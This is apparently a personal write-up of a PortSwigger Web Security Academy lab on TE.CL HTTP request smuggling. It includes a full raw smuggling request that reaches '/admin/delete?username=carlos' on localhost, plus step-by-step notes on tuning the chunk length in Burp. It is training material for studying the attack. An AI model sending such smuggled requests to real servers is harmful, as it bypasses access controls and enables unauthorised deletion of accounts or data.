

1. Try to access the admin path;

![](/static/img/Pasted_image_20231202112040.png)

2. Execute the following request to solve the lab :p 

```http
POST / HTTP/1.1
Host: 0add00b70485be4e806fee2100600057.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

50
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 6

0
```

![](/static/img/Pasted_image_20231202120532.png)



#### The solution step by step..


1. First we need to verify that the lab is TE.CL request smuggler;
2. The best approach is to:
	1. Send the (two) request to repeater and change the GET / to POST /
	2. Add the Content-Length header;
	3. Use the burp inspector while select the payload;
![](/static/img/Pasted_image_20231202120842.png)
3. Notice that the 0x28 is the value of the "chunked" string, that we send to the server;
> This is the most important part, because without this, we cant manipulate the path to delete carlos user;

![](/static/img/Pasted_image_20231202121054.png)

4. Now change the path to admin, and verify the size of the string again, send the malicious request and verify with the "normal" the exploit:


![](/static/img/Pasted_image_20231202121251.png)

5. Change the path to `/admin/delete?username=carlos` and exploit 

![](/static/img/Pasted_image_20231202121330.png)

> remember to verify the length of the string before the 0;


![](/static/img/Pasted_image_20231202121432.png)